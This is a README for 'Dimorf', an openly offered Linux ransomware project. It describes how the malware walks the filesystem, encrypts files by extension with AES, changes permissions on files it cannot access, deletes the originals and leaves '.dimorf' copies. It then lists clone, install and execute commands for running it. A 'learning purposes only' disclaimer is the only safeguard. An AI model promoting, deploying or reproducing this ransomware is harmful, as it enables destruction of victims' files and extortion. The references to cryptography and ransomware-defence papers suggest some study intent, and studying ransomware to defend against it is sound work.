# Dimorf
Dimorf is a ransomware using 256-bit AES with a self-destructing, randomly generated key for Linux OS´s 


## Warning⚠️
- <b>"This code was created for learning purposes only and must not be used to damage or harm other users in any way. Use at your own risk."</b>

## Why Dimorf?
- This name came as inspiration from the Mr. Robot, where the main character is a morphine user, the pharmaceutical name of morphine is dimorf, in parts the name was also inspired by the [LKM Rootkit Diamorphine](https://github.com/m0nad/Diamorphine). Diamorphine is the pharmaceutical name for Heroin.

## Features
- <b>check_os:</b> checks if the operating system is a Linux type and if Python is running on version 3. If both conditions are true, the encrypt function is called.

- <b>find_and_encrypt</b>: searches for files in a given path <b>(path)</b> and checks if these files have a specific extension <b>(ext_files)</b>. If a file has a valid extension, the function checks that it is not a hidden file <b>(begins with ".")</b>. If a file meets these conditions, the function checks whether the current user has read, write, and access permissions for that file. If this is the case, the function starts a file encryption process using AES <b>(Advanced Encryption Standard)</b> and replaces the original file with the encrypted version with the <b>".dimorf"</b> extension. If the current user does not have read, write, or file access permissions. In this case, the function tries to change the permissions of the file to 0o644 in octal base <b>(meaning that the owner of the file has read and write permissions and all other users have read-only permissions)</b>. If the permission change is successful, the function again starts the process of encrypting the file, replacing the original file with the encrypted version and removing the original file. Otherwise, the function generates a log file called <b>"log_dimorf.log"</b> where show the files that could not have their permission changed.

## Install

- Clone the repository
 ```
 git clone https://github.com/Ort0x36/Dimorf.git
 ```
 
- Enter the folder
```
cd Dimorf 
```

- Install requirements
```
pip install -r requirements.txt
```

- Execution permission
```
chmod +x dimorf.py
```

- Exec
```
./dimorf.py
```

## References

- [Introduction to Crypto](http://www.inf.ufsc.br/~bosco.sobral/ensino/ine5630/material-cripto-seg/Introducao-Criptografia.pdf)

- [Symmetric Encryption](https://github.com/brunocampos01/seguranca-de-redes)

- [OS - Python Module](https://docs.python.org/3/library/os.html)

- [Understanding how ransomwares working](https://www.mcafee.com/enterprise/en-us/assets/white-papers/wp-understanding-ransomware-strategies-defeat.pdf)

